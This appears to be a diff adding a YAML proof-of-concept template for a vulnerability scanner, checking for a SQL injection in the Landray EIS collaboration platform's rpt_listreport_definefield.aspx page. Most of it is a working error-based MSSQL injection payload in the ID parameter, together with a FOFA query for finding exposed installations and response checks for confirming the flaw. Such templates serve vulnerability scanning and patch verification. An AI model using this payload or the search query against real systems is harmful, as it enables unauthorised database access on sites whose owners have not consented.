@@ -1,0 +1,18 @@
+id: poc-yaml-landray-eis-rpt-listreport-definefield-aspx-sqli
+info:
+  name: 蓝凌EIS 智慧协同平台 rpt_listreport_definefield.aspx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 蓝凌EIS
+  fofa: app="Landray-EIS智慧协同平台"
+variables:
+  t1: random_int(100,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27{{.t1}}%27))--+
+  expression: status_code == 500 && contains(body,t2) && contains(body,"转换成数据类型 int
+    时失败") && contains(body,"在将 nvarchar 值")
+transport: http
